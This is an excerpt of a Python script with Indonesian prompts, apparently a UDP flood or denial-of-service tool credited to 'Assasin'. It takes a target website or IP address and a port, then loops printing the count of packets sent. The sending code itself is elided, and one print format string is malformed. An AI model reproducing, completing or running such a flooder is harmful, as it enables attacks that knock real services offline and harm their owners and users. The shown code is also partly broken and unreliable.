...
by: Assasin
    ...
    try:
        while True:
            ...
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"Buka situs web(ej:google.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+"alamat IP  : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"Sampai jumpa lagi :D"+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'opsi tidak valid!'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"nomor pelabuhan  : "+Fore.RESET))
    ...
    try:
        while True:
            ...
            print(color_random+"Paket %dikirim %melalui port:%s" % (sent, ip, port))
            if bytes==65537:
                bytes=1
            elif port==1900:
                port=1901
